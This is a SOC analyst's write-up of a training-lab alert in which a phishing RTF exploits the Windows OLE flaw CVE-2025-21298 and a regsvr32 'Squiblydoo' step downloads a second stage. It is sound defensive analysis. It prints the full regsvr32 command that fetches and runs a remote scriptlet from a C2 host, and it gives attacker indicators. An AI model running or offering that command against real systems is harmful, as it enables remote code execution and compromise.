# 	SOC336 - Windows OLE Zero-Click RCE Exploitation Detected (CVE-2025-21298)

## Executive Summary

On February 4, 2025, the Security Operations Center (SOC) detected a successful Remote Code Execution (RCE) attack against a user, **Austin**, originating from a malicious email. The investigation confirmed that the attacker exploited **CVE-2025-21298**, a critical "zero-click" vulnerability in Windows OLE. The attacker sent a specially crafted RTF document which, upon being opened or previewed in Microsoft Outlook, triggered the exploit. Post-exploitation analysis from endpoint logs reveals the attacker then used a "living-off-the-land" technique (`regsvr32.exe`) to download and execute a secondary payload from a command-and-control (C2) server. The attack was fully successful, resulting in a compromised host. This is a **True Positive** critical incident.

## Incident Details

The initial alert was triggered by an email attachment matching a known exploit pattern:

<img width="1554" height="548" alt="image" src="https://github.com/user-attachments/assets/32b1cf5e-3332-41d6-be96-4339cde5ec4d" />

| | |
| :--- | :--- |
| **Date of Incident**| February 4, 2025 |
| **Attacker IP/Domain**| 84.38.130.118 |
| **Destination User**| Austin@letsdefend.io |
| **Attack Type**| Remote Code Execution (RCE) via CVE-2025-21298 |
| **Delivery Vector**| Phishing Email with malicious RTF attachment |
| **Attachment Hash**| `df993d037cdb77a435d6993a37e7750dbbb16b2df64916499845b56aa9194184` |
| **Case Link**| *([Case link](https://app.letsdefend.io/case-management/casedetail/sohankanna/314))* |

## Investigation and Analysis

### 1. Vulnerability Profile: CVE-2025-21298

**CVE-2025-21298** is a critical remote code execution vulnerability in the Windows Object Linking and Embedding (OLE) interface. It is particularly dangerous due to its "zero-click" (or "low-touch") nature.

*   **How it Works:** The vulnerability exists in how Windows parses and handles embedded objects within Rich Text Format (`.rtf`) files. An attacker can craft a malicious OLE object that, when rendered, causes a memory corruption error, allowing them to execute arbitrary code on the victim's machine.
*   **Zero-Click Vector:** The primary attack vector is Microsoft Outlook. Because Outlook uses the Microsoft Word rendering engine to display RTF emails, the exploit can be triggered simply by the user **previewing the email in the Reading Pane**. No clicks on links or enabling of macros are required, making it exceptionally effective.
*   **Impact:** Successful exploitation gives the attacker an initial foothold on the victim's machine, with the ability to run code with the same permissions as the logged-in user.

### 2. Reconstructing the Attack Chain: From Email to C2

The investigation confirmed a clear, four-stage attack chain.

**Stage 1: Delivery via Phishing Email**
The attack began with a socially engineered email sent to `Austin@letsdefend.io`. The email had a subject designed to create urgency ("Important: Action Required...") and contained the malicious attachment, `mail.rtf`. Email security logs show the `Device Action: Allowed`, meaning the email successfully bypassed initial security filters and was delivered to the user's inbox.

<img width="1552" height="487" alt="image" src="https://github.com/user-attachments/assets/34c73a4e-2dfc-48b4-b3a5-45ba5633f810" />

**Stage 2: Successful Exploitation (RCE on Endpoint)**
Endpoint security logs provide the "smoking gun" evidence that the exploit was successful. The `OUTLOOK.EXE` process is seen spawning a `cmd.exe` (command prompt) process. This is highly anomalous behavior and a definitive indicator of compromise; a mail client should never launch a command shell.

<img width="1028" height="413" alt="image" src="https://github.com/user-attachments/assets/6da9a886-f13b-4a72-9190-6c70d4674b94" />

**Stage 3: Post-Exploitation (Downloading the Second Stage)**
The command executed by the exploit is a well-known LOLBin (Living-off-the-Land Binary) technique known as "Squiblydoo".

<img width="649" height="122" alt="image" src="https://github.com/user-attachments/assets/c874fbf5-87d0-491f-a325-0658f83867ba" />

*   **Command:** `regsvr32.exe /s /u /i:http://84.38.130.118.com/shell.sct scrobj.dll`
*   **Explanation:** The attacker uses `regsvr32.exe`, a legitimate Windows utility, to download and execute a remote scriptlet file (`shell.sct`) from their C2 server. This is a fileless technique that avoids dropping a traditional executable on disk, helping to evade antivirus detection.

**Stage 4: Confirmation of C2 Communication**
Network logs confirm that the previous stage worked. The `cmd.exe` process successfully made a GET request to the C2 URL, and the connection was `Permitted`. This confirms the second-stage payload was successfully downloaded to the victim machine.

<img width="637" height="295" alt="image" src="https://github.com/user-attachments/assets/b73d34af-65f2-4229-bf50-fc7d618ad840" />

### 3. Threat Intelligence

Both the attachment hash and the C2 server's IP address (`84.38.130.118`) are confirmed as malicious by VirusTotal, reinforcing the hostile intent of the activity.

<img width="1777" height="877" alt="image" src="https://github.com/user-attachments/assets/6f47927f-d96d-43f3-802a-551865a3ca7d" />
<img width="1790" height="765" alt="image" src="https://github.com/user-attachments/assets/c88a3c3e-f1d2-4fc8-ac19-05c5d1cd8ea2" />

## Skills and Tools Utilized

*   **Tools Used:** SIEM, EDR, Email Security Gateway, Network Logs, VirusTotal
*   **Skills Demonstrated:** Zero-Day Exploit Analysis (CVE-2025-21298), LOLBin Technique Recognition (Squiblydoo), Phishing Analysis, Attack Chain Reconstruction.

## Playbook Solution: Incident Classification

*   **Was Malware Quarantined?** **No.** The initial file was allowed, and the second stage was successfully downloaded.
*   **Was C2 Requested?** **Yes, Accessed.** The host successfully connected to the C2 server.
*   **Was the Attack Successful?** **Yes.** Confirmed RCE and second-stage payload download.
*   **Incident Classification:** **True Positive.**

## Conclusion and Recommendations

The alert for SOC336 was a **true positive** for a successful RCE attack. The attacker leveraged a critical zero-click vulnerability to gain an initial foothold and then downloaded a secondary payload. The host and the user account `Austin` are fully compromised.

**Recommendations:**

1.  **CONTAINMENT - Isolate Host Immediately:** Disconnect the user's machine from the network to sever the C2 connection and prevent lateral movement.
2.  **CREDENTIALS - Disable and Reset:** Immediately disable the `Austin` user account in Active Directory. Once the investigation is complete, the password must be reset before re-enabling. Invalidate all active sessions.
3.  **ESCALATE:** Immediately escalate this incident to the Tier 2/Incident Response (IR) team for full forensic analysis.
4.  **INVESTIGATION:** The IR team must determine the nature of the `shell.sct` payload to understand the attacker's objectives. They must hunt for persistence mechanisms, credential theft, and any signs of lateral movement.
5.  **PATCHING:** Ensure all Windows systems are patched against CVE-2025-21298 immediately.
6.  **BLOCK INDICATORS:** Block the attacker's C2 IP (`84.38.130.118`) and the sender's domain (`pm.me`) at the firewall and email gateway.
7.  **HUNT:** Proactively search email logs across the entire organization for any other recipients of the `mail.rtf` attachment from this sender.
